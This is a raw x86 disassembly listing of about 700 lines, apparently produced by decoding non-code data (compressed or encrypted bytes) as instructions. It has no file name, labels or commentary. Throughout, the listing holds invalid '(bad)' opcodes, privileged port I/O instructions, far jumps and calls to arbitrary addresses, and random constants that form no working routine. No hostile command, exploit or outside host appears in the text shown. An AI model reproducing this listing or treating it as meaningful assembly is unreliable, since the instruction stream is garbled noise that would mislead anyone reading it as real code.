  417616:	fstp   DWORD PTR [ebx+0x33]
  417619:	in     eax,0xe
  41761b:	inc    edi
  41761c:	dec    edx
  41761d:	pop    esi
  41761e:	mov    dl,0x4a
  417620:	outs   dx,DWORD PTR ds:[esi]
  417621:	loopne 0x41768c
  417623:	mov    ebp,0x6113ed94
  417628:	imul   ebp,DWORD PTR [ebx-0x26],0xffffff89
  41762c:	jo     0x417611
  41762e:	inc    ecx
  41762f:	adc    BYTE PTR [edi],ch
  417631:	cdq    
  417632:	(bad)  
  417633:	dec    esi
  417634:	add    dl,BYTE PTR gs:[ebp-0x5]
  417638:	out    0xc5,al
  41763a:	test   al,0x88
  41763c:	packssdw mm1,QWORD PTR [ecx]
  41763f:	pop    eax
  417640:	(bad)  
  417641:	mov    bh,0x97
  417643:	push   edx
  417644:	mov    ebp,0x4fa5ca3d
  417649:	add    ch,BYTE PTR [ebp+0x51a74938]
  41764f:	mov    ds:0x72920036,eax
  417654:	mov    ch,0xb
  417656:	cli    
  417657:	or     BYTE PTR [eax+ebp*1],al
  41765a:	sub    DWORD PTR [ebx-0x59408dc8],ecx
  417660:	adc    BYTE PTR [eax+0x12],ch
  417663:	arpl   WORD PTR [eax+0x37],si
  417666:	adc    al,0x33
  417668:	scas   al,BYTE PTR es:[edi]
  417669:	addr16 push 0x19
  41766c:	mov    ebp,0xedf8cd57
  417671:	fist   DWORD PTR [ecx+0x4c47bb1e]
  417677:	dec    esp
  417678:	ret    0x1775
  41767b:	mov    ebp,0x3a88ebd7
  417680:	test   BYTE PTR [edi],bl
  417682:	daa    
  417683:	adc    edi,DWORD PTR [edx+eiz*8+0x5d00f229]
  41768a:	out    dx,eax
  41768b:	mov    DWORD PTR [ebp-0x13e09662],ebp
  417691:	fdiv   DWORD PTR [eax-0x34]
  417694:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417695:	and    ebp,DWORD PTR ds:0x75452c72
  41769b:	mov    ebx,0xaaea902f
  4176a0:	xor    al,0x88
  4176a2:	add    bl,bh
  4176a4:	xchg   ebx,eax
  4176a5:	jbe    0x417671
  4176a7:	stc    
  4176a8:	fimul  DWORD PTR [eax]
  4176aa:	or     ah,BYTE PTR [eax]
  4176ac:	sbb    esp,DWORD PTR [edi+0x6daebe7f]
  4176b2:	or     DWORD PTR [edx+0x49af038b],eax
  4176b8:	jg     0x4176b4
  4176ba:	mov    WORD PTR [ecx+edi*8-0x4ebac6a2],es
  4176c1:	aaa    
  4176c2:	inc    esp
  4176c3:	inc    esi
  4176c4:	xchg   edx,eax
  4176c5:	repnz test al,0x11
  4176c8:	(bad)  
  4176ca:	dec    ebp
  4176cb:	gs mov dh,cl
  4176ce:	loope  0x41769f
  4176d0:	push   cs
  4176d1:	jbe    0x417713
  4176d3:	xor    cl,bl
  4176d5:	pushf  
  4176d6:	in     al,dx
  4176d7:	loop   0x417712
  4176d9:	jecxz  0x4176c6
  4176db:	daa    
  4176dc:	stos   BYTE PTR es:[edi],al
  4176dd:	test   BYTE PTR [edi],al
  4176df:	adc    eax,0x76db6b0e
  4176e4:	sbb    DWORD PTR [ebx+ecx*2-0x55],ebp
  4176e8:	mov    esp,0xd6b20921
  4176ed:	outs   dx,DWORD PTR ds:[esi]
  4176ee:	nop
  4176ef:	mov    al,0xc
  4176f1:	(bad)  
  4176f2:	(bad)  
  4176f3:	jp     0x41773e
  4176f5:	in     al,dx
  4176f6:	ja     0x41772c
  4176f8:	scas   eax,DWORD PTR es:[edi]
  4176f9:	xchg   edx,eax
  4176fa:	aas    
  4176fb:	sbb    bh,BYTE PTR [esi+0x680b409]
  417701:	pop    ebp
  417702:	popa   
  417703:	add    al,0x41
  417705:	adc    al,0x40
  417707:	outs   dx,DWORD PTR ds:[esi]
  417708:	and    edi,0x45b49e5
  41770e:	xchg   ebp,eax
  41770f:	shr    BYTE PTR es:[eax+ecx*1+0x7924a3bf],0x33
  417718:	and    eax,0xa8a18f78
  41771d:	cmp    DWORD PTR [ebp-0x719c05d7],ecx
  417723:	mov    fs,WORD PTR [ebp+0x4]
  417726:	inc    ebp
  417727:	pop    ebp
  417728:	sbb    dl,BYTE PTR [eax+eiz*1-0x10]
  41772c:	lea    eax,[eax]
  41772e:	aam    0x85
  417730:	adc    ecx,edx
  417732:	dec    ecx
  417733:	(bad)  
  417735:	adc    ch,ah
  417737:	gs call 0x17723a67
  41773d:	lods   eax,DWORD PTR ds:[esi]
  41773e:	clc    
  41773f:	pop    edi
  417740:	mov    ecx,0x70c13857
  417745:	daa    
  417746:	sub    ebp,DWORD PTR [edi+0x108350fd]
  41774c:	sub    ax,0xb407
  417750:	mov    ch,0x18
  417752:	test   al,0x62
  417754:	shl    DWORD PTR ds:[esi-0x6fcaa759],1
  41775b:	mov    ah,0xa5
  41775d:	pop    ebx
  41775e:	jno    0x4177b5
  417760:	add    al,0xdc
  417762:	mov    esp,0x5819b668
  417767:	mov    esi,0xe3022ec2
  41776c:	cmp    al,0x8
  41776e:	dec    ecx
  41776f:	push   0xffffffbf
  417771:	fild   QWORD PTR [esi-0x42461696]
  417777:	call   0xce7cf5e1
  41777c:	cmp    esp,DWORD PTR [edx-0x42]
  41777f:	add    BYTE PTR [edx],dl
  417781:	cs and bl,0x6c
  417785:	gs loope 0x41772a
  417788:	retf   0xdb4a
  41778b:	and    al,BYTE PTR [esi-0x4]
  41778e:	push   ebx
  41778f:	dec    eax
  417790:	retf   
  417791:	scas   eax,DWORD PTR es:[edi]
  417792:	jg     0x4177ae
  417794:	add    bh,BYTE PTR [ebx+0x37]
  417797:	lods   al,BYTE PTR ds:[esi]
  417798:	test   edx,edx
  41779a:	or     BYTE PTR [ecx],dl
  41779c:	outs   dx,DWORD PTR ds:[esi]
  41779d:	push   es
  41779e:	jo     0x4177dd
  4177a0:	mov    cl,0xce
  4177a2:	and    bl,bl
  4177a4:	iret   
  4177a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177a6:	lahf   
  4177a7:	adc    esi,DWORD PTR [edx-0x6]
  4177aa:	pop    eax
  4177ab:	enter  0xba7b,0x81
  4177af:	inc    edx
  4177b0:	inc    eax
  4177b1:	mov    ebx,0xe1535e73
  4177b6:	mov    cl,0x23
  4177b8:	mov    al,0x7d
  4177ba:	push   ecx
  4177bb:	pop    ebp
  4177bc:	xor    cl,dl
  4177be:	add    ch,BYTE PTR [esi-0x74bf0646]
  4177c4:	pop    eax
  4177c5:	xor    eax,esp
  4177c7:	xchg   esi,eax
  4177c8:	pextrw eax,(bad),0xc5
  4177ca:	add    bh,cl
  4177cc:	mov    eax,0x343973ac
  4177d1:	xchg   esi,eax
  4177d2:	inc    ebx
  4177d3:	icebp  
  4177d4:	xor    ebx,DWORD PTR [eax+eiz*1]
  4177d7:	stos   BYTE PTR es:[edi],al
  4177d8:	mov    ds:0xce473659,eax
  4177dd:	pop    edx
  4177de:	mov    ds,WORD PTR [esi]
  4177e0:	(bad)  
  4177e1:	xchg   ecx,eax
  4177e2:	fiadd  DWORD PTR [edi-0x2fb32d70]
  4177e8:	inc    esi
  4177e9:	imul   ebx,DWORD PTR [edi-0x2df67425],0xfffffff7
  4177f0:	mov    edx,0xbff70b21
  4177f5:	jl     0x4177de
  4177f7:	add    dl,ch
  4177f9:	adc    al,0xa
  4177fb:	dec    edx
  4177fc:	jmp    0x5579:0xc5c3652c
  417803:	popf   
  417804:	shl    DWORD PTR [ebx+0x3b2fe26],cl
  41780a:	retf   0xda67
  41780d:	and    edi,DWORD PTR [edi-0x2a0b8969]
  417813:	(bad)  [edi+edi*8-0x32]
  417817:	outs   dx,DWORD PTR ds:[esi]
  417818:	xor    DWORD PTR [esi],edx
  41781a:	sbb    ebp,DWORD PTR [eax]
  41781c:	sub    DWORD PTR [edx+0x22],eax
  41781f:	clc    
  417820:	icebp  
  417821:	mov    eax,ebp
  417823:	dec    ecx
  417824:	sub    eax,0x9d79d0b9
  417829:	sbb    BYTE PTR [ebx+0x54],0xa4
  41782d:	inc    esp
  41782e:	int    0x7
  417830:	not    DWORD PTR [eax+0x2b]
  417833:	dec    edi
  417834:	stos   DWORD PTR es:[edi],eax
  417835:	and    edi,DWORD PTR [esi-0x4]
  417838:	xor    BYTE PTR [edx-0x3e3439b4],bh
  41783e:	push   edx
  41783f:	inc    edi
  417840:	(bad)  
  417841:	cld    
  417842:	jmp    0xfff0394a
  417847:	call   0xfa3e:0x2b82a252
  41784e:	shr    DWORD PTR [esi+ecx*2-0x6a],0xd0
  417853:	sub    al,0xd9
  417856:	sbb    ch,cl
  417858:	hlt    
  417859:	pop    edx
  41785a:	into   
  41785b:	mov    ch,0x27
  41785d:	inc    esp
  41785e:	mov    ah,BYTE PTR [esi+eax*1]
  417861:	mov    cl,0x0
  417863:	jae    0x4178dc
  417865:	adc    BYTE PTR es:[edx-0x38],bh
  417869:	(bad)  [ecx]
  41786b:	sahf   
  41786c:	sbb    eax,0xaa8514b7
  417871:	xor    BYTE PTR [eax+0x1b],0x6d
  417875:	loopne 0x417803
  417877:	out    dx,eax
  417878:	ret    0x4aeb
  41787b:	les    eax,FWORD PTR [edi-0x2d3fdadd]
  417881:	aaa    
  417882:	xchg   DWORD PTR [eax+0x1],ebp
  417885:	dec    edi
  417886:	jnp    0x4178da
  417888:	call   0xf357:0x9767811c
  41788f:	ins    DWORD PTR es:[edi],dx
  417890:	xchg   esi,eax
  417891:	(bad)  [ebx+ebp*8+0x14]
  417895:	mov    esi,0x13d4a920
  41789a:	adc    ebp,DWORD PTR [ecx+esi*4+0x108d9e4a]
  4178a1:	lods   al,BYTE PTR ds:[esi]
  4178a2:	(bad)  
  4178a3:	leave  
  4178a4:	mov    esp,0x40b4917b
  4178a9:	outs   dx,DWORD PTR ds:[esi]
  4178aa:	mov    eax,DWORD PTR [ebx-0x78]
  4178ad:	mov    BYTE PTR [ecx+0x73],ch
  4178b0:	pop    ss
  4178b1:	out    dx,al
  4178b2:	rcr    DWORD PTR [ebp-0x80],cl
  4178b5:	or     edx,DWORD PTR [ebx+esi*1]
  4178b8:	or     DWORD PTR [ebx+0x17],eax
  4178bb:	pop    esp
  4178bc:	jae    0x4178b8
  4178be:	xor    ah,BYTE PTR [esi]
  4178c0:	or     eax,0xa286439d
  4178c5:	push   0xffdbb86
  4178ca:	fidivr WORD PTR [ebx+edx*8]
  4178cd:	ret    0x1ab8
  4178d0:	(bad)
  4178d4:	adc    al,0x99
  4178d6:	sbb    al,0x30
  4178d8:	sub    eax,0x2c3e8f89
  4178dd:	es push ebp
  4178df:	jl     0x417958
  4178e1:	call   0xf68dc12f
  4178e6:	sbb    DWORD PTR [ecx-0x5d8ae6f4],edi
  4178ec:	sbb    eax,0x48356f04
  4178f1:	(bad)  
  4178f2:	fistp  WORD PTR [edi]
  4178f4:	mov    al,ds:0x17d0f590
  4178f9:	pusha  
  4178fa:	mov    dl,0x1b
  4178fc:	ds das 
  4178fe:	pop    ss
  4178ff:	imul   ebx,edi,0x92698e83
  417905:	adc    al,0x4a
  417907:	xchg   esi,eax
  417908:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417909:	sbb    al,0x58
  41790b:	mov    DWORD PTR ds:0x51c7d3d,ebp
  417911:	ins    DWORD PTR es:[edi],dx
  417912:	fld    DWORD PTR [ebx-0x6e]
  417915:	retf   0xa498
  417918:	outs   dx,BYTE PTR ds:[esi]
  417919:	pop    ds
  41791a:	jae    0x4178b1
  41791c:	retf   
  41791d:	rcl    DWORD PTR [edi+0x66314c2a],0xb9
  417924:	sub    al,0xaf
  417926:	mov    edi,esi
  417928:	mov    ebx,0xb54805f3
  41792d:	mov    dl,0x34
  41792f:	arpl   sp,dx
  417931:	push   edx
  417932:	aaa    
  417933:	dec    esi
  417934:	ja     0x41792e
  417936:	jge    0x417957
  417938:	or     eax,0x2c2dc097
  41793d:	cmp    eax,0x7a40c5b3
  417942:	inc    ebp
  417943:	and    al,0x3c
  417945:	int3   
  417946:	mov    al,0xd
  417948:	in     eax,dx
  417949:	mov    ch,bh
  41794b:	pop    ss
  41794c:	adc    eax,0x64c792f5
  417951:	clc    
  417952:	aad    0xe8
  417954:	xor    eax,0xbd211004
  417959:	or     eax,DWORD PTR [edi-0x46]
  41795c:	jnp    0x4179c0
  41795e:	fidiv  DWORD PTR ss:[ecx+0x1386367d]
  417965:	pop    ebx
  417966:	loop   0x41793b
  417968:	dec    ebx
  417969:	mov    esp,0x1126edfa
  41796e:	push   0x30
  417970:	mov    ds:0xca3b45d3,al
  417975:	jnp    0x4179b7
  417977:	jno    0x41792e
  417979:	jmp    0x39a3:0x75635fd9
  417980:	cmp    eax,0x1d137e8c
  417985:	out    0x5,eax
  417987:	or     cl,bh
  417989:	pop    esp
  41798a:	test   al,0x6e
  41798c:	pop    ebp
  41798d:	add    BYTE PTR [esi+0x9],ah
  417990:	adc    dh,0x81
  417993:	mov    esp,0x2fe0c1e
  417998:	sub    BYTE PTR [ecx+0x73c49c90],dl
  41799e:	imul   ah
  4179a0:	aam    0xb2
  4179a2:	push   ds
  4179a3:	jbe    0x4179aa
  4179a5:	jmp    0x70b0:0xace16fee
  4179ac:	out    dx,eax
  4179ad:	mov    edi,DWORD PTR [si-0x7f]
  4179b1:	push   esi
  4179b2:	arpl   WORD PTR [ebx+ebx*1+0x7e],di
  4179b6:	xor    edx,DWORD PTR [ebx+0x24]
  4179b9:	jo     0x4179da
  4179bb:	mov    dl,0xac
  4179bd:	xchg   esi,eax
  4179be:	mov    esp,DWORD PTR [ebp+0x35]
  4179c1:	add    DWORD PTR [ecx-0xf],ebp
  4179c4:	lods   al,BYTE PTR ds:[esi]
  4179c5:	gs jp  0x4179a1
  4179c8:	or     al,0xc6
  4179ca:	cmp    DWORD PTR [edi],ebx
  4179cc:	or     eax,DWORD PTR cs:[esi]
  4179cf:	and    ebp,ebp
  4179d1:	lds    ecx,FWORD PTR [eax]
  4179d3:	pop    esp
  4179d4:	int3   
  4179d5:	inc    ecx
  4179d6:	(bad)  
  4179d7:	mov    ah,0xc1
  4179d9:	ret    
  4179da:	mov    dl,0x1b
  4179dc:	retf   0x44f2
  4179df:	mov    cl,0xcd
  4179e1:	sahf   
  4179e2:	mov    edi,0x24e3ce15
  4179e7:	inc    eax
  4179e8:	fdivr  DWORD PTR [esi]
  4179ea:	test   DWORD PTR [ecx+edx*1],ebp
  4179ed:	pop    esp
  4179ee:	dec    eax
  4179ef:	sbb    BYTE PTR [ecx],bl
  4179f1:	inc    ecx
  4179f2:	push   ebp
  4179f3:	pop    ebx
  4179f4:	fcomp  DWORD PTR [esi-0x24]
  4179f7:	das    
  4179f8:	or     DWORD PTR [edx-0x34],ebx
  4179fb:	loope  0x417a0d
  4179fd:	loopne 0x417a15
  4179ff:	adc    ah,BYTE PTR [edx+0x49]
  417a02:	pop    ss
  417a03:	les    esi,FWORD PTR fs:[ebx]
  417a06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a07:	aam    0xa5
  417a09:	mov    dl,0x9c
  417a0b:	jno    0x4179d7
  417a0d:	push   cs
  417a0e:	repnz cmp DWORD PTR [eax-0x69],eax
  417a12:	(bad)
  417a15:	ins    DWORD PTR es:[edi],dx
  417a16:	cs inc ebx
  417a18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a19:	jne    0x417a5e
  417a1b:	call   0xa33a15cd
  417a20:	pop    esp
  417a21:	ja     0x4179c2
  417a23:	xor    al,0x62
  417a25:	addr16 jbe 0x417a56
  417a28:	sbb    al,0xba
  417a2a:	cmc    
  417a2b:	(bad)  
  417a2c:	xchg   ecx,eax
  417a2d:	pop    esi
  417a2e:	or     BYTE PTR [esp+eax*1+0x13],al
  417a32:	data16 bnd jo 0x417a0c
  417a36:	test   DWORD PTR [esp+edi*1],esp
  417a39:	sub    BYTE PTR [ebx],dl
  417a3b:	ret    0xc88c
  417a3e:	cli    
  417a3f:	xor    eax,0x24fced
  417a44:	or     al,0xee
  417a46:	imul   esi,DWORD PTR [esi+0x331a06b4],0x4e
  417a4d:	xor    DWORD PTR [esi+0x67],0xffffff9a
  417a51:	xor    al,0x6a
  417a53:	xchg   esi,eax
  417a54:	inc    ecx
  417a55:	out    0x7b,eax
  417a57:	jnp    0x417ad2
  417a59:	jecxz  0x417a97
  417a5b:	jbe    0x417a9a
  417a5d:	fsub   st(7),st
  417a5f:	push   eax
  417a60:	inc    esp
  417a61:	(bad)  
  417a63:	(bad)  
  417a64:	or     BYTE PTR [edx+0x581aa4aa],0x86
  417a6b:	enter  0xb8d4,0x68
  417a6f:	ret    
  417a70:	jo     0x417a7c
  417a72:	shl    ch,1
  417a74:	xchg   esp,eax
  417a75:	jle    0x417a6b
  417a77:	jns    0x417a1d
  417a79:	inc    esp
  417a7a:	adc    ecx,DWORD PTR [esi]
  417a7c:	cmp    BYTE PTR [eax+0x3],ah
  417a7f:	and    al,0x16
  417a81:	push   esi
  417a82:	xchg   edi,eax
  417a83:	mov    dh,0xa4
  417a85:	mov    bl,0xe3
  417a87:	cmp    ecx,DWORD PTR [ebp-0x4c]
  417a8a:	xor    eax,0x65ebe06c
  417a8f:	gs dec edi
  417a91:	dec    edi
  417a92:	data16 fmul QWORD PTR [ebx-0x28]
  417a96:	ja     0x417b07
  417a98:	out    dx,eax
  417a99:	adc    eax,0x3c627dc
  417a9e:	in     al,0x1e
  417aa0:	pusha  
  417aa1:	stc    
  417aa2:	inc    ebx
  417aa3:	in     al,dx
  417aa4:	out    0xe2,al
  417aa6:	mov    ebp,0x65ad7076
  417aab:	inc    ebx
  417aac:	(bad)  
  417aad:	(bad)  
  417aae:	sub    DWORD PTR ds:0x9266307b,esp
  417ab4:	test   eax,0x2d1744a1
  417ab9:	outs   dx,DWORD PTR ds:[esi]
  417aba:	adc    al,0x7c
  417abc:	repnz (bad) [edx+0x79]
  417ac0:	xchg   ebp,eax
  417ac1:	mov    bh,BYTE PTR [edx-0x12]
  417ac4:	sti    
  417ac5:	loop   0x417a8d
  417ac7:	rol    esi,1
  417ac9:	jbe    0x417afb
  417acb:	xchg   BYTE PTR [edx+0x2e91fbb3],cl
  417ad1:	(bad)  
  417ad2:	cld    
  417ad3:	bnd jge 0x417a6c
  417ad6:	je     0x417a8a
  417ad8:	fadd   st(2),st
  417ada:	adc    al,0x60
  417adc:	pushf  
  417add:	fwait
  417ade:	jne    0x417b38
  417ae0:	dec    esp
  417ae1:	inc    ebx
  417ae2:	loopne 0x417ad5
  417ae4:	push   edx
  417ae6:	addr16 pop edi
  417ae8:	lods   eax,DWORD PTR ds:[esi]
  417ae9:	dec    esp
  417aea:	xchg   esi,eax
  417aeb:	mov    WORD PTR [eax+0x62],ds
  417aee:	nop
  417aef:	xchg   ebx,eax
  417af0:	(bad)  
  417af1:	retf   0xd0c
  417af4:	add    BYTE PTR [esi+0x41c7f34c],al
  417afa:	inc    esi
  417afb:	xchg   ebx,eax
  417afc:	sahf   
  417afd:	les    esi,FWORD PTR ds:0xc7b7e6fe
  417b03:	(bad)  
  417b04:	aad    0xcc
  417b06:	jl     0x417abe
  417b08:	cmp    edi,esp
  417b0a:	pop    ds
  417b0b:	mov    ebx,0xdba840cb
  417b10:	jo     0x417b57
  417b12:	sub    al,0x4d
  417b14:	inc    edi
  417b15:	jo     0x417b01
  417b17:	xchg   esi,eax
  417b18:	adc    ch,cl
  417b1a:	sbb    ecx,0xe06e446a
  417b20:	push   esi
  417b21:	jo     0x417ae9
  417b23:	into   
  417b24:	mov    dl,0x9
  417b26:	dec    ebx
  417b27:	test   BYTE PTR [edx+0x59],al
  417b2a:	pop    ebx
  417b2b:	outs   dx,BYTE PTR ds:[esi]
  417b2c:	mov    bh,0x85
  417b2e:	out    0xf5,eax
  417b30:	lods   eax,DWORD PTR ds:[esi]
  417b31:	aas    
  417b32:	cmp    DWORD PTR [edi-0x2f],ebx
  417b35:	or     dl,BYTE PTR [edi-0x69]
  417b38:	imul   ecx,DWORD PTR [edx-0x51],0xffffff93
  417b3c:	pop    ds
  417b3d:	pop    esi
  417b3e:	inc    ebp
  417b3f:	ficom  DWORD PTR [ecx]
  417b41:	mov    bl,0xe5
  417b43:	(bad)  
  417b44:	(bad)  
  417b45:	fld    DWORD PTR ds:0x433f22d1
  417b4b:	jle    0x417b49
  417b4d:	frstor [esi+eiz*8]
  417b50:	and    BYTE PTR [esi+0x67045728],al
  417b56:	aas    
  417b57:	xor    al,dl
  417b59:	dec    edi
  417b5a:	inc    ebp
  417b5b:	daa    
  417b5c:	xor    BYTE PTR [ecx-0x5158c8fe],dl
  417b62:	push   cs
  417b63:	or     al,dl
  417b65:	push   cs
  417b66:	mov    eax,0x8a9aaab7
  417b6b:	cmp    BYTE PTR [edx-0xe],cl
  417b6e:	pop    edi
  417b6f:	cwde   
  417b70:	adc    eax,0x5d2e0cc0
  417b75:	cli    
  417b76:	mul    BYTE PTR [edx-0xf]
  417b79:	sub    DWORD PTR [edx],esi
  417b7b:	(bad)  
  417b7d:	push   edi
  417b7e:	pop    ds
  417b7f:	aam    0x79
  417b81:	gs aaa 
  417b83:	std    
  417b84:	mov    ah,0xfa
  417b86:	jge    0x417be4
  417b88:	xchg   DWORD PTR [ebp+0x35],ebx
  417b8b:	sub    al,0xc0
  417b8d:	or     al,0x30
  417b8f:	loope  0x417bf2
  417b91:	ins    DWORD PTR es:[edi],dx
  417b92:	cmp    al,0x9d
  417b94:	push   ebp
  417b95:	push   edi
  417b96:	leave  
  417b97:	pop    es
  417b98:	jno    0x417b3a
  417b9a:	add    edx,DWORD PTR [edx]
  417b9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b9d:	shl    DWORD PTR cs:[esi+0x1c6214b7],0x5a
  417ba5:	add    dh,BYTE PTR [ecx+0x613656a8]
  417bab:	fisttp QWORD PTR [edx+0x382bda57]
  417bb1:	sbb    BYTE PTR [eax+0x7ed3ea29],bh
  417bb7:	out    0x2e,eax
  417bb9:	push   ebp
  417bba:	hlt    
  417bbb:	mov    dh,0x95
  417bbd:	dec    esi
  417bbe:	xor    edi,DWORD PTR [edx+0x7f971967]
  417bc4:	mov    cl,0x91
  417bc6:	adc    al,0xa4
  417bc8:	rcr    BYTE PTR [edx],0xdd
  417bcb:	push   cs
  417bcc:	pop    esi
  417bcd:	xchg   DWORD PTR [edx],edx
  417bcf:	je     0x417b62
  417bd1:	cmp    eax,0x4e614b27
  417bd6:	push   edi
  417bd7:	pop    ss
  417bd8:	xchg   ecx,eax
  417bd9:	jp     0x417b8f
  417bdb:	iret   
  417bdc:	dec    ebx
  417bdd:	dec    esp
  417bde:	push   edx
  417bdf:	or     al,BYTE PTR [esi-0x18efd229]
  417be5:	add    BYTE PTR [edi+0x43be652],bl
  417beb:	repnz cmp BYTE PTR [edi+0x3339b6b6],dl
  417bf2:	call   0xb0dc0081
  417bf7:	and    cl,BYTE PTR [esi-0x12a7d52a]
  417bfd:	dec    edx
  417bfe:	sub    eax,0x5cc5a07a
  417c03:	sbb    ah,BYTE PTR [ebp-0x6eeec29e]
  417c09:	or     eax,0xf1c874cc
  417c0e:	xor    esi,DWORD PTR [ecx+0x5e1bba87]
  417c14:	int3   
  417c15:	fidiv  DWORD PTR [ebx-0x583886d3]
  417c1b:	stos   DWORD PTR es:[edi],eax
  417c1c:	mov    BYTE PTR [edx+edx*1+0x47],bh
  417c20:	jnp    0x417ba2
  417c22:	mov    dl,BYTE PTR ds:0xc8ce2477
  417c28:	push   edx
  417c29:	push   esi
  417c2a:	and    eax,0xb5175b78
  417c2f:	outs   dx,DWORD PTR ds:[esi]
  417c30:	std    
  417c31:	js     0x417c70
  417c33:	lock adc al,0xdc
  417c36:	in     al,dx
  417c37:	repz mov esi,0xf7f3ab8c
  417c3d:	les    edx,FWORD PTR [ebx]
  417c3f:	sub    al,0x14
  417c41:	daa    
  417c42:	push   esp
  417c43:	fs icebp 
  417c45:	sub    DWORD PTR [ebx-0x1c075b6b],esp
  417c4b:	push   ss
  417c4c:	adc    ah,BYTE PTR [eax+0x3c90900a]
  417c52:	rol    BYTE PTR [edx],1
  417c54:	pop    esi
  417c55:	xor    BYTE PTR [esi+edi*2],0x2e
  417c59:	xor    eax,0x5d725150
  417c5e:	mov    bl,0xdd
  417c60:	outs   dx,BYTE PTR ds:[esi]
  417c61:	das    
  417c62:	nop
  417c63:	pushf  
  417c64:	in     eax,dx
  417c65:	jb     0x417c4d
  417c67:	push   esp
  417c68:	push   ss
  417c69:	shr    ebp,0x23
  417c6c:	jne    0x417c92
  417c6e:	out    0xd7,eax
  417c70:	(bad)  
  417c71:	outs   dx,BYTE PTR ds:[esi]
  417c72:	nop
  417c73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c74:	sbb    DWORD PTR [edi-0xb],edi
  417c77:	dec    BYTE PTR [ebp-0x25cec2a9]
  417c7d:	pusha  
  417c7e:	jnp    0xca11c2cc
  417c84:	mov    BYTE PTR [edx-0x3a],0x64
  417c88:	lods   eax,DWORD PTR ds:[esi]
  417c89:	dec    eax
  417c8a:	in     eax,dx
  417c8b:	adc    eax,0x15064968
  417c90:	push   ebx
  417c91:	adc    DWORD PTR [ecx+0x28ddb215],eax
  417c97:	mov    ch,0xef
  417c99:	out    0xa2,eax
  417c9b:	or     ebp,DWORD PTR [ebp+ebp*4+0x7e5ae5b9]
  417ca2:	clc    
  417ca3:	mov    ds:0xbfbc6e4,eax
  417ca8:	fidiv  WORD PTR [esi]
  417caa:	jl     0x417c5b
  417cac:	add    ah,bl
  417cae:	jmp    0x6be3cd41
  417cb3:	out    0xfa,al
  417cb5:	fdivr  QWORD PTR [ecx+0x33]
  417cb8:	sbb    DWORD PTR [ebx-0x7c357bc2],0xffffffbf
  417cbf:	rcl    DWORD PTR [eax+0x2ca1aacc],cl
  417cc5:	sbb    BYTE PTR [edx+0x3460a7fc],dh
  417ccb:	mov    ds,WORD PTR [edi]
  417ccd:	inc    edx
  417cce:	stos   BYTE PTR es:[edi],al
  417ccf:	mov    ebx,DWORD PTR [ebx-0x3]
  417cd2:	push   ebp
  417cd3:	mov    gs,WORD PTR [ebp-0x5562766a]
  417cd9:	adc    esi,ecx
  417cdb:	out    dx,al
  417cdc:	lods   eax,DWORD PTR ds:[esi]
  417cdd:	add    cl,bh
  417cdf:	fbld   TBYTE PTR [ecx+0x4e]
  417ce2:	(bad)  
  417ce4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ce5:	sahf   
  417ce6:	dec    edx
  417ce7:	stos   BYTE PTR es:[edi],al
  417ce8:	mov    esi,0xf7f8febd
  417ced:	into   
  417cee:	push   ecx
  417cef:	cmp    bh,BYTE PTR [ebx+0x116066f6]
  417cf5:	mov    ecx,0xbd1a21b0
  417cfa:	addr16 aas 
  417cfc:	(bad)  
  417cfd:	cwde   
  417cfe:	and    DWORD PTR [edx+0x11f0438f],esi
  417d04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d05:	mov    esi,0xfe606a47
  417d0a:	lea    ebx,[esi-0x45]
  417d0d:	add    bh,BYTE PTR [edx-0x2e]
  417d10:	test   al,0xe0
  417d12:	xor    al,0xd9
  417d15:	cmp    DWORD PTR [eax+0x7d4d7181],esi
  417d1b:	cmp    ebp,DWORD PTR [edi+edx*8+0x74879249]
  417d22:	int3   
  417d23:	pop    ecx
  417d24:	jl     0x417d57
  417d26:	sub    ch,cl
  417d28:	and    BYTE PTR [ecx+0x28df893a],bl
  417d2e:	ja     0x417ce0
  417d30:	cmp    eax,0xf1c420a
  417d35:	mov    esi,DWORD PTR [esi]
  417d37:	(bad)  
  417d38:	mul    dh
  417d3a:	out    0x5e,eax
  417d3c:	push   ebp
  417d3d:	test   DWORD PTR [edx+0x34],esp
  417d40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d41:	loope  0x417d0c
  417d43:	jne    0x417d3b
  417d45:	arpl   bp,si
  417d47:	clc    
  417d48:	xor    al,0x52
  417d4a:	jle    0x417d34
  417d4c:	pop    esp
  417d4d:	mov    eax,0xe3fb2939
  417d52:	hlt    
  417d53:	sub    eax,0x5cf7beb
  417d58:	pop    edx
  417d59:	dec    eax
  417d5a:	es and eax,0xd4ceb19d
  417d60:	sub    al,0x40
  417d62:	ficom  WORD PTR [ecx+0x76]
  417d65:	scas   al,BYTE PTR es:[edi]
  417d66:	push   ds
  417d67:	lods   eax,DWORD PTR ds:[esi]
  417d68:	mov    ch,0xc3
  417d6a:	mov    edx,DWORD PTR [ecx-0x32a8af07]
  417d70:	sub    eax,0xf9dd518f
  417d75:	mov    ds:0x7bb98a76,al
  417d7a:	shl    ah,0xcb
  417d7d:	cdq    
  417d7e:	mov    bl,0x68
  417d80:	(bad)  
  417d82:	leave  
  417d83:	stc    
  417d84:	xchg   DWORD PTR gs:[ecx*1-0x5766b41e],ebp
  417d8c:	sub    BYTE PTR ds:0xaf26b167,0xce
  417d93:	and    al,0x60
  417d95:	pop    ebp
  417d96:	inc    eax
  417d97:	push   cs
  417d98:	ss fwait
  417d9a:	pop    ebx
  417d9b:	mov    dh,0xb5
  417d9d:	sub    DWORD PTR [eax+0x50f8d147],edx
  417da3:	mov    cl,0xcd
  417da5:	jno    0x417d2b
  417da7:	pop    ecx
  417da8:	jg     0x417d88
  417daa:	into   
  417dab:	lds    edx,FWORD PTR [ecx+0x27]
  417dae:	push   edi
  417daf:	(bad)  
  417db0:	out    0x68,al
  417db2:	mov    eax,0xb6c7314a
  417db7:	push   ds
  417db8:	in     al,dx
  417db9:	stc    
  417dba:	out    dx,al
  417dbb:	pop    DWORD PTR [eax-0x5cf47c9a]
  417dc1:	dec    BYTE PTR [edi-0x6cba047e]
  417dc7:	cwde   
